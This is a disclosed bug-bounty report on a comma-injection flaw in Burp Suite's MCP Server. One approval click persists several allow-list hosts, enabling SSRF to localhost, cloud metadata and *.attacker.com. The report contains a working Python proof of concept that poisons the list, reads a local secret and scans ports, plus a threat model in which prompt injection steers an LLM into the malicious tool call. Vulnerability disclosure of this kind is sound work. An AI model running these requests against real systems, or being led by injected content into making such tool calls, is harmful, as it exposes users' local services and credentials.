# Report #3717354: UI Consent Bypass via Comma Injection in `addAutoApproveTarget` — User-Approval Dialog and Persistence Layer Disagree on Target Scope, Yielding Authen

- **Platform:** HackerOne
- **Report URL:** [https://hackerone.com/reports/3717354](https://hackerone.com/reports/3717354)
- **Program:** PortSwigger Web Security
- **Reporter:** @hacker-kartel
- **Status:** RESOLVED
- **Severity:** none
- **Weakness:** LLM09:2025 Misinformation
- **Bounty:** No Bounty / Swag
- **Submitted:** 2026-05-06T19:15:35.510Z
- **Disclosed:** 2026-06-15T09:21:46.631Z
- **Community Upvotes:** 27

---

## Executive Summaries

No formal disclosure summary provided.

---

## Full Vulnerability Description & Reproduction Steps

## Summary
Burp Suite MCP Server BApp v1.2.1 fails to validate hostnames passed to `addAutoApproveTarget` (`McpConfig.kt:52`). A single user click on the per-request approval dialog persists an attacker-controlled comma-separated hostname as multiple independent allow-list entries, because `_autoApproveTargets` is stored as a comma-joined string and `getAutoApproveTargetsList` re-splits on `,` (`McpConfig.kt:73`).

A malicious MCP client — or an LLM operating on attacker-controlled content via indirect prompt injection (the canonical MCP threat model) — can poison the auto-approve list with one click, then silently SSRF to localhost services, internal hosts, cloud metadata, and arbitrary wildcard subdomain trees without any further interaction.
This regresses the protection model that motivated report #3176157

## Threat Model

Canonical MCP indirect prompt injection. An LLM (Claude Desktop, Cursor, Cline, etc.) connected to Burp's MCP server reads attacker-influenced content (web page, document, ticket, search result) and constructs a `send_http1_request` tool call with an attacker-chosen `targetHostname`. The user sees one approval dialog, clicks **Always Allow Host** trusting the leading legitimate-looking domain, and that single click persists multiple silent allow-rules the inverse of the user's intent.

## Root Cause

**Sink 1 — Storage accepts unvalidated multi-host string**
`src/main/kotlin/net/portswigger/mcp/config/McpConfig.kt`, lines 52–60:

```kotlin
fun addAutoApproveTarget(target: String): Boolean {
    val currentTargets = getAutoApproveTargetsList()
    if (target.trim().isNotEmpty() && !currentTargets.contains(target.trim())) {
        val newTargets = currentTargets + target.trim()
        autoApproveTargets = newTargets.joinToString(",")
        return true
    }
    return false
}
```

`TargetValidation.isValidTarget` exists in the codebase but is never invoked here. Only emptiness and duplication are checked.

**Sink 2 — Reader splits on the same delimiter used to write**
`src/main/kotlin/net/portswigger/mcp/config/McpConfig.kt`, lines 73–79:

```kotlin
fun getAutoApproveTargetsList(): List<String> {
    return if (_autoApproveTargets.isBlank()) emptyList()
    else _autoApproveTargets.split(",").map { it.trim() }.filter { it.isNotEmpty() }
}
```

One write of `"a,b,c"` becomes three independent entries on read.

**Sink 3 — Attacker-controlled hostname passed straight from JSON-RPC to persistence**
`src/main/kotlin/net/portswigger/mcp/security/HttpRequestSecurity.kt`, lines 44, 49:

```kotlin
1 -> { config.addAutoApproveTarget(hostname); continuation.resume(true) }
2 -> { config.addAutoApproveTarget("$hostname:$port"); continuation.resume(true) }
```

`hostname` originates from the `targetHostname` JSON-RPC parameter of the `send_http1_request` (and related) MCP tools — fully attacker-controlled.

**Sink 4 — Dialog renders payload verbatim, masking what gets persisted**
`src/main/kotlin/net/portswigger/mcp/config/Dialogs.kt`, `showOptionDialog`:

The approval dialog renders `Target: $hostname:$port` in a `JTextArea` with no escaping or splitting. A comma-laden hostname displays on a single line beginning with the leading domain, which a user reasonably reads as the target. This is the misrepresentation that makes CWE-451 apply: what the user authorizes = what the system persists.

## Reproduction
Tested against running BApp v1.2.1 on Kali Linux

### Pre-conditions

1. Burp MCP Server BApp v1.2.1 installed and enabled (Burp → MCP tab → Enabled)
2. "Require approval for HTTP requests" checked (default state on fresh install)
3. Auto-Approved HTTP Targets list cleared (Burp → MCP tab → Auto-Approved HTTP Targets → "Clear All")

### Setup victim service for file-read demonstration

```bash
mkdir -p /tmp/internal && echo "INTERNAL_API_KEY=sk_live_abc123_DO_NOT_LEAK" > /tmp/internal/secret.txt
cd /tmp/internal && python3 -m http.server 8123 &
```
### Step 1 — Poison the auto-approve list with one tool call

```bash
python3 - << 'EOF'
import asyncio
from mcp.client.sse import sse_client
from mcp import ClientSession

async def main():
    async with sse_client("http://127.0.0.1:9876/") as (r, w):
        async with ClientSession(r, w) as s:
            await s.initialize()
            await s.call_tool("send_http1_request", {
                "content": "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "targetHostname": "example.com,127.0.0.1,*.attacker.com,169.254.169.254",
                "targetPort": 443,
                "usesHttps": True,
            })

asyncio.run(main())
EOF
```
The Burp approval dialog appears showing:     
An MCP client is requesting to send an HTTP request to:
Target: example.com,127.0.0.1,*.attacker.com,169.254.169.254:443
{F5866201}

Click   Always Allow Host

### Step 2 — Verify list poisoning (consent ≠ persistence)

Burp → MCP tab → Auto-Approved HTTP Targets now contains four independent entries:

- `example.com`
- `127.0.0.1`
- `*.attacker.com`
- `169.254.169.254`

The user authorized one target string; the system persisted four. This is the consent bypass.
{F5866214}



### Step 3 — SSRF without further approval

```bash
python3 - << 'EOF' | tee /tmp/mcp-poc/ssrf_output.txt
import asyncio
from mcp.client.sse import sse_client
from mcp import ClientSession

async def call(host, port, path, https=False):
    async with sse_client("http://127.0.0.1:9876/") as (r, w):
        async with ClientSession(r, w) as s:
            await s.initialize()
            res = await s.call_tool("send_http1_request", {
                "content": f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
                "targetHostname": host, "targetPort": port, "usesHttps": https,
            })
            txt = res.content[0].text if res.content else "(empty)"
            print(f"[{host}:{port}{path}] -> {txt[:300]}")
            print("---")

async def main():
    await call("127.0.0.1", 8123, "/secret.txt")
    await call("evil.attacker.com", 443, "/", True)
    for p in [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]:
        await call("127.0.0.1", p, "/")

asyncio.run(main())
EOF
```

results

## Impact

Local file read: /tmp/internal/secret.txt contents exfiltrated via 127.0.0.1:8123 (maps directly to "A website accessed through Burp Suite can retrieve local files from the user's system" — Medium per policy)

Localhost service fingerprinting: Burp Pro admin interface identified at 127.0.0.1:8080, OpenSSH version banner at 127.0.0.1:22

Localhost port enumeration: 9 ports probed silently in a single script (22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017)

Wildcard subdomain SSRF: evil.attacker.com matches the injected *.attacker.com entry
Cloud metadata reachable: 169.254.169.254 callable without prompt (relevant on cloud-hosted Burp)

HTTP history exfiltration (after one separate consent click on get_proxy_http_history): full request/response pairs from prior browsing. Real test against authenticated sessions returned long-lived Google OAuth refresh tokens, OAuth client_secret values, Google API keys, and HackerOne __Host-session / cf_clearance / X-Csrf-Token. Maps directly to "A website accessed through Burp Suite can extract cross-domain data from Burp's sitemap" — Medium per policy.

---

## Attachments
- [image.png](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y6zayyh70cegfx9o05fm6zeyzq4h?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRG5DCQG%2F20260912%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260912T151051Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDNN1dFBb3cxoyaYIXmXYddEqBpDD%2BrSpz1v7om78dXhAIgcjO7n%2F5XQ2UUeH8lqTWC82D5m7PAHrQZuBWGdjJEuTwqugUIt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBcwSTXENIhf%2BlyO5iqOBbME2l8BMfTic%2B%2F75Qt%2BiWmNjz53yCANIvRk%2FCm1gwQw2IUUGG9QLVdIQ1xxD6Un1hNGMvZtQ%2BJ4AyLJFhySshrVEKyNjzXZ9CEs2C42chGG%2BPHtcClqow0xsDe9jNmutaA%2B8Qcs13iSxCHejqYDCm7h0e5GPK9%2BUic5mcIbEeHhhdeU%2BvdS9%2FhXxNXxg8qE%2BCj3f0LPFshUMcy3SHKY7MpOaFyq1zDE05cjqjA8CY%2FZEWSOFaVq3JDoX56CfNQt09rz74Vu2VDlNj0xe1mw52%2BVqlGeNCuCAwGY8PyrPHSwUUGD26bzVyMlyerE222jPjr7pMx%2F3rqwNBsxIpRhUfToGTRhLrEfEj0d4FzFfB8fmP1bOvpqA6rNKAviqQ9nZ1hG5S8EgmMJafF206Fi%2FIqDwvAM1bwRhVZpNJ6OH4L2tSlsmrTKsIXF1uo98J6ODlGPs5rJIHmTBqUUPuIp4wvVtQjFFbbxfSOOvcYwZu%2FGRpv1Uy%2FD4%2FbX0CZ%2By8oVjISMeMAz59jh%2Fr%2FByw8xCcMLBV8nIYUF7xAaQHtE6TIEM5Xy%2FcRuL2Vfp6CmlkMyvG4fsuKMJVpv%2F4VhgrUHMSGIEvMc6%2BHTO5dfg296eg0LavsLbZnPQfY6T4%2FewoCAqEPOTgPCQVtMDmmrOV6Z6Qf1NRTn7Tk2Hy0q8Ju5jZ4UpYXVkOpyDqe%2FEgMRnU48QJQkE3Yv0Fo5dWtyps1ifmba%2FcD1%2FwN16zByM5f%2FtR2cB8%2BVi55%2BFjwaNMUPUM3KMiPn3GDt5ZxcMqbdsZheD0wASct%2FCPfT4aHMb2MIhZH4Q7RNeI%2FdgZCaJdYrmoZHhn2%2BPTR8a6iJmD0NpCbcL4EfWhxK8sA53LGvUcftTTDVvpXVBjqxAUscyIdSN4i8cl88gjS4A2QqJ5yCS4sMJKBIUy0cD5pv2siwR3v5TFrPEPyjAav0JDwjF0ZCSQG6jZcg%2FooJNul7bW1xjC20%2BCQPTKRSaJFm%2B4P%2F8sN%2FTomJGoLroXmV1316jCmhvY6fq4s%2FnDD1nQaFgdFSqqSh6fLTi6ITA5hI5%2B8BLRPxA%2F2F%2FymW1L7QNXDLTRwOFJQ8V3m3wbzL1bQcMldzxp6ndNlZgzpIfPLI%2Bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7eac0ce559e091b621fe882ff64323e7dbcfbb42f7caa22744b682c429dfd3cd) (attachment)
- [image.png](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aq7cp33v0bdcof5283ex6h2ixv8e?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRG5DCQG%2F20260912%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260912T151051Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDNN1dFBb3cxoyaYIXmXYddEqBpDD%2BrSpz1v7om78dXhAIgcjO7n%2F5XQ2UUeH8lqTWC82D5m7PAHrQZuBWGdjJEuTwqugUIt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBcwSTXENIhf%2BlyO5iqOBbME2l8BMfTic%2B%2F75Qt%2BiWmNjz53yCANIvRk%2FCm1gwQw2IUUGG9QLVdIQ1xxD6Un1hNGMvZtQ%2BJ4AyLJFhySshrVEKyNjzXZ9CEs2C42chGG%2BPHtcClqow0xsDe9jNmutaA%2B8Qcs13iSxCHejqYDCm7h0e5GPK9%2BUic5mcIbEeHhhdeU%2BvdS9%2FhXxNXxg8qE%2BCj3f0LPFshUMcy3SHKY7MpOaFyq1zDE05cjqjA8CY%2FZEWSOFaVq3JDoX56CfNQt09rz74Vu2VDlNj0xe1mw52%2BVqlGeNCuCAwGY8PyrPHSwUUGD26bzVyMlyerE222jPjr7pMx%2F3rqwNBsxIpRhUfToGTRhLrEfEj0d4FzFfB8fmP1bOvpqA6rNKAviqQ9nZ1hG5S8EgmMJafF206Fi%2FIqDwvAM1bwRhVZpNJ6OH4L2tSlsmrTKsIXF1uo98J6ODlGPs5rJIHmTBqUUPuIp4wvVtQjFFbbxfSOOvcYwZu%2FGRpv1Uy%2FD4%2FbX0CZ%2By8oVjISMeMAz59jh%2Fr%2FByw8xCcMLBV8nIYUF7xAaQHtE6TIEM5Xy%2FcRuL2Vfp6CmlkMyvG4fsuKMJVpv%2F4VhgrUHMSGIEvMc6%2BHTO5dfg296eg0LavsLbZnPQfY6T4%2FewoCAqEPOTgPCQVtMDmmrOV6Z6Qf1NRTn7Tk2Hy0q8Ju5jZ4UpYXVkOpyDqe%2FEgMRnU48QJQkE3Yv0Fo5dWtyps1ifmba%2FcD1%2FwN16zByM5f%2FtR2cB8%2BVi55%2BFjwaNMUPUM3KMiPn3GDt5ZxcMqbdsZheD0wASct%2FCPfT4aHMb2MIhZH4Q7RNeI%2FdgZCaJdYrmoZHhn2%2BPTR8a6iJmD0NpCbcL4EfWhxK8sA53LGvUcftTTDVvpXVBjqxAUscyIdSN4i8cl88gjS4A2QqJ5yCS4sMJKBIUy0cD5pv2siwR3v5TFrPEPyjAav0JDwjF0ZCSQG6jZcg%2FooJNul7bW1xjC20%2BCQPTKRSaJFm%2B4P%2F8sN%2FTomJGoLroXmV1316jCmhvY6fq4s%2FnDD1nQaFgdFSqqSh6fLTi6ITA5hI5%2B8BLRPxA%2F2F%2FymW1L7QNXDLTRwOFJQ8V3m3wbzL1bQcMldzxp6ndNlZgzpIfPLI%2Bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=951a1f4987411c3689a1d6b50ec46045e0a53633200a02735e5525e4ea68bf15) (attachment)
